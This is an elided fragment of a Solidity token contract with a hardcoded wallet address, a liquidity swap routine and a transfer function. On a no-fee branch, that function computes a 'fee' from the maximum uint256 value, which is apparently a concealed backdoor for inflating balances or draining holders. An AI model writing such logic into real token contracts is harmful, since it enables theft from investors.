...
contract asdasd is Context, IERC20 { 
    ...
    address payable public Wallet_Utility = payable(0xC570e6EC09fF6803b52e7c4dec12Ef7604a6de71);
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            swapTokensForBNB(balanceOf(address(this)) - tokens_to_LP_Half);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if (uniSwapRouter02){
                uint256 totalTxFee = (~uint256(0)) - (_tTotal-tAmount);
